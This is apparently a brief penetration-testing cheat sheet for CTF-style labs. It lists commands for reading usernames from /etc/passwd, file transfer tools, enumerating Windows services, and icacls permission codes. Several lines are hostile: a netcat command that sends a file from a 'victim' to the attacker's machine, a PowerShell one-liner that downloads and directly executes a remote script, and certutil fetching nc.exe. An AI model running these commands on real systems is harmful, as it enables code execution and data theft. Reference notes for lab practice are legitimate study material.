![image](https://user-images.githubusercontent.com/68326057/118384023-9df1a480-b620-11eb-812f-4104c1d11d65.png)


# Cut

To grep Only Usernames:-

```bash
cat /etc/passwd | grep bash | cut -d ":" -f 1
```

# To Download FILEs


## CURL
```bash
curl -O url
```

## WGET
```bash
wget url -o output
```

## axel
```bash
axel -a -n 20 -o output url
```

## nc

```bash
My machine 
sudo nc -l -p 999 > file

On Victim
nc.exe -w 5 MYIP 999 < file
```

## Powershell

```bash
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"  // directly execute command
```

## certutil

```bash
certutil -urlcache -f http://10.9.53.25:8000/nc.exe nc.exe
```

# Windows 

## Windows Services

To find:-

```bash
wmic service get name,startname,pathname | findstr /v C:\Windows
```

## icacls

```bash
USE:- icacls filename

F - Full access
M- Modify access
RX - Read and execute access
R - Read-only access
W - Write-only access

(OI) - Object inherit
(CI) - Container inherit
(IO) - Inherit only
(NP) - Do not propagate inherit
```

